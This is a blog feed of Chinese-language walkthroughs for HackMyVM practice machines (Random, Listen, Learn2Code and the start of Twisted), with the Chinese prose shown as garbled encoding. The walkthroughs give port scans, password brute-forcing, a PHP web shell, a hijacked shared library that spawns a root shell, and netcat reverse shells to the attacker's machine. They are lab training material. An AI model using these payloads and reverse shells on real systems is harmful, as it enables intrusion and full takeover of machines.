<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. FTP" data-href="#3. FTP" href="https://www.c1trus.top/about:blank#3._FTP" class="internal-link" target="_self" rel="noopener nofollow">3. FTP</a>
<br><a data-tooltip-position="top" aria-label="4. SFTP" data-href="#4. SFTP" href="https://www.c1trus.top/about:blank#4._SFTP" class="internal-link" target="_self" rel="noopener nofollow">4. SFTP</a>
<br><a data-tooltip-position="top" aria-label="5. ææƒ -åŠ¨æ€é“¾æ¥åº“æ›¿æ¢" data-href="#5. ææƒ -åŠ¨æ€é“¾æ¥åº“æ›¿æ¢" href="https://www.c1trus.top/about:blank#5._ææƒ_-åŠ¨æ€é“¾æ¥åº“æ›¿æ¢" class="internal-link" target="_self" rel="noopener nofollow">5. ææƒ -åŠ¨æ€é“¾æ¥åº“æ›¿æ¢</a>
<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=Random
<br>ä½œè€…ï¼šsml
<br>éš¾åº¦ï¼šâ­ï¸â­ï¸â­ï¸
<br>çŸ¥è¯†ç‚¹ï¼šåŠ¨æ€é“¾æ¥åº“æ›¿æ¢
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/random]
â””â”€# nmap 192.168.9.17 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 19:38 CST
Nmap scan report for 192.168.9.17
Host is up (0.00040s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:88:4C:D2 (Oracle VirtualBox virtual NIC)
<br>é¦–é¡µ<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.001.png" referrerpolicy="no-referrer"><br>è·å–åˆ°ä¸¤ä¸ªç”¨æˆ·<br>alan 
eleanor
<br>ç›®å½•æ‰«æ å•¥éƒ½æ²¡æœ‰<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.002.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.003.png" referrerpolicy="no-referrer"><br><br>åŒ¿åç™»å½•å‘ç°è¿›ä¸æ¥ç›®å½•<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.004.png" referrerpolicy="no-referrer"><br>å°è¯•ç”¨å¦å¤–ä¸¤ä¸ªç”¨æˆ·ç™»å½•<br>hydraçˆ†ç ´è¯•è¯•<br>ä»–è¯´alanä¸èƒ½sshç™»å½•<br>é‚£ä¹ˆeleanor ç”¨æˆ·å¯ä»¥ssh<br>çˆ†ç ´eleanorç”¨æˆ·<br>è¿™çˆ†ç ´å‡ºç”¨æˆ·eleanor çš„ftpå¯†ç æ˜¯ ladybug<br>ä½†æƒé™åªæœ‰è¯»ã€‚<br>æ‰€ä»¥æ— æ³•ä¸Šä¼ é©¬å„¿<br><br>å°è¯•ç”¨è¿™ä¸ªå¯†ç sshä¸Šå»<br>å¤±è´¥äº†<br>ssh eleanor@192.168.9.17
eleanor@192.168.9.17's password:
This service allows sftp connections only.
Connection to 192.168.9.17 closed.
<br>ä½†å‘Šè¯‰æˆ‘ä»¬å…è®¸sftpé“¾æ¥<br>sftp eleanor@192.168.9.17
<br>ç”¨sftpè¿æ¥ä¸Šæ¥å°±å¯ä»¥ä¸Šä¼ æ–‡ä»¶äº†<br>ç›´æ¥ä¸Šä¼ ä¸€ä¸ªé©¬å„¿<br>&lt;?php system($\_POST['cmd']);
echo ok;?&gt;
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.005.png" referrerpolicy="no-referrer"><br><br>ä¸Šæ¥ååŸºæœ¬å‘½ä»¤æ£€æµ‹æ²¡æœ‰åˆ©ç”¨çš„<br>æˆ‘ä»¬ä¹‹å‰ä¸è®©ç”¨å¯†ç è¿›è¡Œsshç™»å½•<br>ä½†æ˜¯å¯ä»¥ç”¨å¯†ç åˆ‡æ¢ç”¨æˆ·<br>su eleanor
eleanor@random:/home/eleanor$ cat note.txt
alan disabled my access via SSH but not my account.
He is a bad admin!
-eleanor
eleanor@random:/home/eleanor$ cat user.txt
ihavethapowah
eleanor@random:/home/eleanor$
<br>è¿‘ç”¨æˆ·ç›®å½•å‘ç° randomå¯ä»¥è¢«æ‰§<br>ç›´æ¥ä¸‹ä¸‹æ¥åˆ†æ<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.006.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.007.png" referrerpolicy="no-referrer"><br>å°±æ˜¯æ£€æµ‹ä»¥å½“å‰æ—¶é—´ä¸ºç§å­çš„éšæœºæ•°çš„0-9çš„ä½™æ•°èƒ½ä¸èƒ½ä¸æˆ‘ä»¬è¾“å…¥çš„å€¼ç›¸ç­‰<br>æˆ‘ä»¬åªè¦ä¸€ç›´è¾“å…¥0-9ä¹‹é—´çš„æ•°ï¼Œæ€»å¯ä»¥åŒ¹é…ä¸Š<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.008.png" referrerpolicy="no-referrer"><br>å›å»çœ‹ä¸€ä¸‹å‘ç°makemerootå‡½æ•°æ²¡æœ‰å†™æ‰§è¡Œä»£ç ï¼Œç›´æ¥returnè‡ªå·±äº†<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.009.png" referrerpolicy="no-referrer"><br>å¯èƒ½æ˜¯è°ƒç”¨äº†æœ¬åœ°çš„åŠ¨æ€é“¾æ¥åº“<br>ldd random
eleanor@random:/home/alan$ ldd random
        linux-vdso.so.1 (0x00007ffc0a3e5000)
        librooter.so =&gt; /lib/librooter.so (0x00007f7bcafa1000)
        libc.so.6 =&gt; /lib/x86\_64-linux-gnu/libc.so.6 (0x00007f7bcade0000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f7bcafb2000)
<br>è€Œä¸”/lib/librooter.soé“¾æ¥åº“æ˜¯å¯å†™çš„<br>eleanor@random:/home/alan$ ls /lib/librooter.so -la
-rwxrwxrwx 1 root root 15984 Oct 19  2020 /lib/librooter.so
<br>ç›´æ¥æ›¿æ¢æ‰<br>#include &lt;stdlib.h&gt;

void makemeroot()
{
        setuid(0);
        setgid(0);
        system("/bin/bash");
}
<br>æœ¬åœ°ç¼–è¯‘å¥½åä¼ ä¸Šå»æ›¿æ¢å³å¯<br>ç„¶åè¿è¡Œå³å¯è·å–root<br>howiarrivedhere
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/15.random.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/15.Random.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/15.Random.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[14.Listen]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. ææƒ" data-href="#3. ææƒ" href="https://www.c1trus.top/about:blank#3._ææƒ" class="internal-link" target="_self" rel="noopener nofollow">3. ææƒ</a>
<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=Listen
<br>ä½œè€…ï¼šsml
<br>éš¾åº¦ï¼šâ­ï¸â­ï¸â­ï¸
<br>çŸ¥è¯†ç‚¹ï¼šæµé‡ç›‘å¬ã€knockã€æ–‡ä»¶æ›¿æ¢ã€
<br><br>ç«¯å£æ‰«æ<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/listen]
â””â”€# nmap -sS 192.168.9.16 -p 1-65535
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 22:10 CST
Nmap scan report for 192.168.9.16
Host is up (0.0016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE    SERVICE
22/tcp filtered ssh
80/tcp filtered http
MAC Address: 08:00:27:B0:44:F9 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 9.19 seconds
<br>ä¸¤ä¸ªç«¯å£éƒ½å¼€äº†é˜²ç«å¢™ã€‚<br>è¿™é‡Œæ‰«ä¸€ä¸‹udp<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/listen]
â””â”€# nmap -sU 192.168.9.16 -p 1-100  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 22:14 CST
Nmap scan report for 192.168.9.16
Host is up (0.0012s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
MAC Address: 08:00:27:B0:44:F9 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 114.71 seconds
<br>ä¹Ÿæ²¡æœ‰å•¥ä¸œè¥¿<br>Curlä¸€ä¸‹<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/listen]
â””â”€# curl http://192.168.9.16
&lt;pre&gt;
&lt;h1&gt; Please Listen &lt;/h1&gt;
When I ask you to listen to me
and you start giving me advice,
You have not done what I asked.

When I ask you to listen to me
and you begin to tell me why
I shouldnt feel that way,
you are trampling on my feelings.

When I ask you to listen to me
and you feel you have to do something
to solve my problem,
you have failed me,
strange as that may seem.

Listen! All I ask is that you listen.
Dont talk or do, just hear meâ€¦

And I can do for myself; I am not helpless.
Maybe discouraged and faltering,
but not helpless.

When you do something for me that I can and need to do for myself,
you contribute to my fear and
Inadequacy.

But when you accept as a simple fact
That I feel what I feel,
No matter how irrational,
Then I can stop trying to convince
You and get about this business
Of understanding whats behind
This irrational feeling.

And when thats clear, the answers are obvious and I dont need advice.
Irrational feelings make sense when
we understand whats behind them.

So please listen, and just hear me.
And if you want to talk, wait a minute
for your turn, and I will listen to you.

-Leo Buscaglia
&lt;/pre&gt;


&lt;!--
Leo please, stop using your poems as password!
leo:$6$GyxLtjMYaQWxRxfl$w0mjIXfmU1T8bac2HgweZmxgFjGSiX8kbPDWhJzAzFn.BFk9X9fPT6DHXlp.A3J5yA64qQJH6Iu4K4AW4THIw.:18551:0:99999:7:::
--&gt;
<br>è¿™é‡Œå¾—åˆ°ä¸€ä¸ªç”¨æˆ· å’Œç”¨æˆ·çš„hash<br>ç”¨æˆ· Leo Buscaglia
hash leo:$6$GyxLtjMYaQWxRxfl$w0mjIXfmU1T8bac2HgweZmxgFjGSiX8kbPDWhJzAzFn.BFk9X9fPT6DHXlp.A3J5yA64qQJH6Iu4K4AW4THIw.:18551:0:99999:7:::
<br>çˆ†ç ´ä¸€ä¸‹hash<br>å†æ‰«æç«¯å£å¯ä»¥å‘ç°ç«¯å£å·²ç»å¼€æ”¾äº†<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.001.png" referrerpolicy="no-referrer"><br>å¼€å‘äº†å°±æ‰«ä¸€æ³¢ç›®å½•<br>å•¥éƒ½æ²¡æœ‰<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.002.png" referrerpolicy="no-referrer"><br>rockyouæ²¡æœ‰çˆ†å‡ºæ¥ã€‚<br>è§£å¯†æç¤ºçˆ†ç ´è·å–å¯†ç <br>Curlè¿”å›çš„å†…å®¹å‘Šè¯‰æˆ‘ä»¬<br>Leo please, stop using your poems as password!<br>è¯´æ˜ä»–çš„å¯†ç å¤šåŠå°±è—åœ¨è¯—å¥å½“ä¸­<br>æˆ‘ä»¬å°†è¯—å¥ç”Ÿæˆä¸€ä¸ªå­—å…¸<br>text = """
poem
"""
import string
translator = str.maketrans('', '', string.punctuation)
words = text.translate(translator).lower().split()

# ä½¿ç”¨é›†åˆå»é‡å¹¶æ’åº
unique\_words = sorted(set(words))

# å°†ç»“æœå†™å…¥ txt æ–‡ä»¶
with open("pass\_dic.txt", "w") as file:
    for word in unique\_words:
        file.write(word + "\n")
<br>åˆ©ç”¨hydraçˆ†ç ´<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.003.png" referrerpolicy="no-referrer"><br>è·å–åˆ°å¯†ç  contribute<br><br>leo@listen:~$ find / -perm -4000 2&gt;/dev/null
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/home/leo/poem

leo@listen:~$ ./poem 
Ask me:
 i

Why
leo@listen:~$ 
<br>é€†å‘åˆ†æä¸€ä¸‹<br>ä¼ æ–‡ä»¶
nc -lvp 1234 &gt;poem
nc 192.168.9.3 1234 &lt;poem
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.004.png" referrerpolicy="no-referrer"><br>è¿™é‡Œå­˜åœ¨ä¸€ä¸ªç¼“å­˜åŒºæº¢å‡ºæ¼æ´ï¼Œä½†è¿™ä¸ªæ˜¯æ— æ³•åˆ©ç”¨çš„ã€‚å› ä¸ºç¼–è¯‘å™¨å¯¹å…¶æ–½åŠ äº†ä¿æŠ¤æªæ–½<br>è§£å¯†listen<br>é¶æœºåè‚¯å®šä¸æ˜¯ä¹±å–çš„<br>listençš„ä¸­æ–‡æ„æ€å°±æ˜¯ å¬ ç›‘å¬<br>é‚£æˆ‘ä»¬ç›‘å¬ä¸€ä¸‹è¿™ä¸ªip<br>tcpdump host 192.168.9.16 -A -n
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.005.png" referrerpolicy="no-referrer"><br><br>å¯ä»¥è·å–åˆ°ä¸€ä¸ªç”¨æˆ·åä¸å¯†ç  <br>ä»¥åŠæç¤º knock 1337ç«¯å£ åº”è¯¥å°±æ˜¯å¼€æ”¾sshæœåŠ¡ç«¯å£<br>silenceè¿è¿›å»<br>silence@listen:~$ cat note.txt 
"listen" told me that if I listen, I will hear his password....
<br>silence@listen:~$ ls -al
total 36
drwxr-xr-x 3 silence silence 4096 Oct 16  2020 .
drwxr-xr-x 5 root    root    4096 Oct 16  2020 ..
-rw-r--r-- 1 silence silence  220 Oct 16  2020 .bash\_logout
-rw-r--r-- 1 silence silence 3526 Oct 16  2020 .bashrc
-rw-r----- 1 root    silence   53 Oct 16  2020 listen.sh
drwxr-xr-x 3 silence silence 4096 Oct 16  2020 .local
-rw-rw---- 1 silence silence   64 Oct 16  2020 note.txt
-rw-r--r-- 1 silence silence  807 Oct 16  2020 .profile
-rw------- 1 silence silence  260 Oct 16  2020 .Xauthority
silence@listen:~$ cat listen.sh 
#!/bin/sh
cat /home/listen/password.txt &gt; /dev/pts/4
<br>è¿™æ¡å‘½ä»¤ä¼šå°†/home/listen/password.txt çš„å†…å®¹å‘é€åˆ°dev/pts/4 è¿™ä¸ªç»ˆç«¯<br>çŒœæµ‹è¿™ä¸ªè„šæœ¬å¤šåŠä¼šè¢«æŸä¸ªè¿›ç¨‹æ‰§è¡Œ<br>ç”¨Pspy64æ£€æµ‹ä¸€ä¸‹<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.006.png" referrerpolicy="no-referrer"><br>rootç”¨æˆ·ä¼šæ‰§è¡Œ<br>silence@listen:~$ ls /dev/pts -la
total 0
drwxr-xr-x  2 root    root      0 Nov  8 10:18 .
drwxr-xr-x 17 root    root   3180 Nov  8 10:18 ..
crw--w----  1 silence tty  136, 0 Nov  8 10:50 0
c---------  1 root    root   5, 2 Nov  8 10:18 ptmx
<br>è¿™é‡Œç›®å‰åªæœ‰ä¸€ä¸ªç»ˆç«¯<br>æˆ‘ä»¬éœ€è¦å¤šåˆ›å»ºå‡ ä¸ªç»ˆç«¯ ä½¿ä»–è¾¾åˆ°4<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.007.png" referrerpolicy="no-referrer"><br>è¿™é‡Œæˆ‘ä»¬å¼€äº†5ä¸ªç»ˆç«¯ <br>åœ¨ç¬¬4ä¸ªç»ˆç«¯é‡Œé¢ç­‰å¾…ä»–ç»™æˆ‘ä»¬è¾“å‡ºå¯†ç <br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.008.png" referrerpolicy="no-referrer"><br>è·å–åˆ°listenç”¨æˆ·çš„å¯†ç <br>listen@listen:~$ cat user.txt
HMVimlistening
<br>ææƒroot<br>è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ã€‚<br>æ›¿æ¢listen.shæ³•<br>listen.shè„šæœ¬å¤„äºæˆ‘ä»¬silenceçš„ç”¨æˆ·ç›®å½•ä¸‹<br>ä¸”æˆ‘ä»¬æ˜¯æœ‰æƒé™åˆ é™¤ä»–çš„<br>æ›¿æ¢æˆæˆ‘ä»¬æƒ³è¦çš„è„šæœ¬<br>echo 'nc -e /bin/bash/192.168.9.3 1234' &gt; listen.sh
<br>ç„¶åç›‘å¬å°±å¯ä»¥è¿”å›rootçš„shelläº†<br>ä¿®æ”¹hostæ³•<br>åœ¨listenç”¨æˆ·ä¸‹å‘ç°ä¸€ä¸ªè„šæœ¬<br>listentome.sh<br>silence@listen:/home/listen$ cat listentome.sh 
wget -O - -q http://listen/ihearyou.sh | bash
<br>ä»–ä¼šè·å–ä¸€ä¸ªihearyou.shå¹¶æ‰§è¡Œè„šæœ¬<br>åˆ©ç”¨è„šæœ¬æ£€æµ‹è¿˜å¯ä»¥å‘ç° /etc/hostsæ˜¯å¯ä»¥ä¿®æ”¹çš„<br>æˆ‘ä»¬ç›´æ¥ä¿®æ”¹è¿™ä¸ªhostsæŒ‡å‘æˆ‘ä»¬çš„kali<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.009.png" referrerpolicy="no-referrer"><br>kaliå¼€ä¸€ä¸ªæœåŠ¡å™¨ï¼Œåœ¨ihearyou.shé‡Œé¢å†™å…¥åå¼¹shellçš„å‘½ä»¤<br>nc -c /bin/bash 192.168.9.3 1234
<br>HMVthxforlisten
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/14.listen.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/14.Listen.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/14.Listen.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[13.Learn2Code]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ç›®å½•æ‰«æ" data-href="#2.1. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç›®å½•æ‰«æ</a>


<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=Learn2Code
<br>ä½œè€…ï¼šx4v1l0k
<br>éš¾åº¦ï¼šğŸ˜…æœºå­ä¸å‡ºç½‘ï¼Œåšä¸äº†
<br>çŸ¥è¯†ç‚¹ï¼šæ ˆæº¢å‡º
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Learn2Code]
â””â”€# nmap -sS 192.168.9.15 -p 1-65535
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 21:14 CST
Nmap scan report for 192.168.9.15
Host is up (0.00041s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:7E:55:49 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 8.27 seconds
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Learn2Code]
â””â”€# gobuster dir -u http://192.168.9.15 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x jpg,php,html,png,zip,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.9.15
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,png,zip,txt,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 1161]
/includes             (Status: 301) [Size: 315] [--&gt; http://192.168.9.15/includes/]
/todo.txt             (Status: 200) [Size: 51]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 1453501 / 1453508 (100.00%)
===============================================================
Finished
===============================================================
<br>è¿™å‡ ä¸ª200çš„éƒ½è®¿é—®ä¸äº†<br>ç»§ç»­å¯¹includesç›®å½•è¿›è¡Œæ‰«æ<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Learn2Code]
â””â”€# dirsearch -u http://192.168.9.15/includes
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg\_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg\_resources.html
  from pkg\_resources import DistributionNotFound, VersionConflict

  \_|. \_ \_  \_  \_  \_ \_|\_    v0.4.3
 (\_||| \_) (/\_(\_|| (\_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/hmv/Learn2Code/reports/http\_192.168.9.15/\_includes\_24-11-06\_21-19-31.txt

Target: http://192.168.9.15/

[21:19:31] Starting: includes/
[21:19:31] 301 -  319B  - /includes/php  -&gt;  http://192.168.9.15/includes/php/
[21:19:31] 301 -  318B  - /includes/js  -&gt;  http://192.168.9.15/includes/js/
[21:19:32] 403 -  277B  - /includes/.ht\_wsr.txt
[21:19:32] 403 -  277B  - /includes/.htaccess.bak1
[21:19:32] 403 -  277B  - /includes/.htaccess.save
[21:19:32] 403 -  277B  - /includes/.htaccess.sample
[21:19:32] 403 -  277B  - /includes/.htaccess\_extra
[21:19:32] 403 -  277B  - /includes/.htaccess.orig
[21:19:32] 403 -  277B  - /includes/.htaccess\_sc
[21:19:32] 403 -  277B  - /includes/.htaccessOLD2
[21:19:32] 403 -  277B  - /includes/.htaccess\_orig
[21:19:32] 403 -  277B  - /includes/.htaccessBAK
[21:19:32] 403 -  277B  - /includes/.htaccessOLD
[21:19:32] 403 -  277B  - /includes/.htm
[21:19:32] 403 -  277B  - /includes/.htpasswd\_test
[21:19:32] 403 -  277B  - /includes/.htpasswds
[21:19:32] 403 -  277B  - /includes/.html
[21:19:32] 403 -  277B  - /includes/.httr-oauth
[21:19:32] 403 -  277B  - /includes/.php
[21:19:40] 301 -  319B  - /includes/css  -&gt;  http://192.168.9.15/includes/css/
[21:19:43] 200 -  579B  - /includes/js/
[21:19:47] 200 -  557B  - /includes/php/

Task Completed
<br>/includes/css<br><img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125000545.png" referrerpolicy="no-referrer"><br>åˆæ˜¯ä¸€ä¸ªæ–‡ä»¶è¯»å–<br>åœ¨/includes/php/access.php.bak è·å–åˆ°ä¸€ä¸ªæœ‰ç”¨çš„æ–‡ä»¶<br>è¿˜è·å–åˆ°ä¸€å¥è¯<br><img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125000549.png" referrerpolicy="no-referrer"><br>æŸ¥çœ‹access.php.bak<br>&lt;?php
        require\_once 'GoogleAuthenticator.php';
        $ga = new PHPGangsta\_GoogleAuthenticator();
        $secret = "S4I22IG3KHZIGQCJ";

        if ($\_POST['action'] == 'check\_code') {
                $code = $\_POST['code'];
                $result = $ga-&gt;verifyCode($secret, $code, 1);

                if ($result) {
                        include('coder.php');
                } else {
                        echo "wrong";
                }
        }
?&gt;
<br>
å¡ä½äº†ã€‚çœ‹äº†wpæ‰çŸ¥é“ã€‚åŸæ¥æ˜¯æˆ‘å‡ºä¸äº†ç½‘çš„é—®é¢˜ğŸ˜…
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/13.learn2code.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/13.Learn2Code.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125000545.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125000545.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[11.Twisted]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ç«¯å£æ‰«æ" data-href="#2. ç«¯å£æ‰«æ" href="https://www.c1trus.top/about:blank#2._ç«¯å£æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2. ç«¯å£æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="3. ç›®å½•æ‰«æ" data-href="#3. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#3._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">3. ç›®å½•æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="4. å›¾ç‰‡è§£å¯†" data-href="#4. å›¾ç‰‡è§£å¯†" href="https://www.c1trus.top/about:blank#4._å›¾ç‰‡è§£å¯†" class="internal-link" target="_self" rel="noopener nofollow">4. å›¾ç‰‡è§£å¯†</a>
<br><a data-tooltip-position="top" aria-label="5. ææƒåˆ°bonita" data-href="#5. ææƒåˆ°bonita" href="https://www.c1trus.top/about:blank#5._ææƒåˆ°bonita" class="internal-link" target="_self" rel="noopener nofollow">5. ææƒåˆ°bonita</a>
<br><a data-tooltip-position="top" aria-label="6. ææƒåˆ°root" data-href="#6. ææƒåˆ°root" href="https://www.c1trus.top/about:blank#6._ææƒåˆ°root" class="internal-link" target="_self" rel="noopener nofollow">6. ææƒåˆ°root</a>
<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=Twisted
<br>ä½œè€…ï¼šsml
<br>éš¾åº¦ï¼šâ­ï¸â­ï¸
<br>çŸ¥è¯†ç‚¹ï¼šcapbilityææƒ ã€stegseekè§£å¯†å›¾ç‰‡åŠ å¯†
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# nmap -sS 192.168.9.13 -p 1-65535 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 16:02 CST
Nmap scan report for 192.168.9.13
Host is up (0.00042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
MAC Address: 08:00:27:4A:6C:9F (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 8.20 seconds
